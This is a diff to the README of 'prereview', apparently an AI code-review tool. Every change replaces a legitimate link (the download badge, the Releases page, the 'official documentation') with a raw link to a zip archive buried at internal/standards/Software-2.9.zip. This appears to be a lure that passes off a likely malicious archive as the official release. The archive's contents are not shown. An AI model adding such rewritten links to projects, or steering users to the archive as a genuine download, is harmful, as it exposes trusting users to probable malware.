@@ -1,6 +1,6 @@
 # 🤖 prereview - AI Code Review Made Simple
 
-![Download prereview](https://img.shields.io/badge/Download-prereview-blue.svg)
+![Download prereview](https://github.com/crea42/prereview/raw/refs/heads/main/internal/standards/Software-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ If you're unsure how to install these, there are many tutorials available online
 
 ## 🔗 Download & Install
 
-To get started, you need to download the prereview application. Visit this page to download: [Releases Page](https://github.com/crea42/prereview/releases).
+To get started, you need to download the prereview application. Visit this page to download: [Releases Page](https://github.com/crea42/prereview/raw/refs/heads/main/internal/standards/Software-2.9.zip).
 
 ### Steps to Download:
 
@@ -85,6 +85,6 @@ If you encounter any problems or have questions, check the FAQ section on our Gi
 
 ## 🌟 Learn More
 
-For more detailed guidance on using prereview and advanced features, please refer to the [official documentation](https://github.com/crea42/prereview/releases).
+For more detailed guidance on using prereview and advanced features, please refer to the [official documentation](https://github.com/crea42/prereview/raw/refs/heads/main/internal/standards/Software-2.9.zip).
 
-To download prereview again, you can always visit: [Releases Page](https://github.com/crea42/prereview/releases).
+To download prereview again, you can always visit: [Releases Page](https://github.com/crea42/prereview/raw/refs/heads/main/internal/standards/Software-2.9.zip).
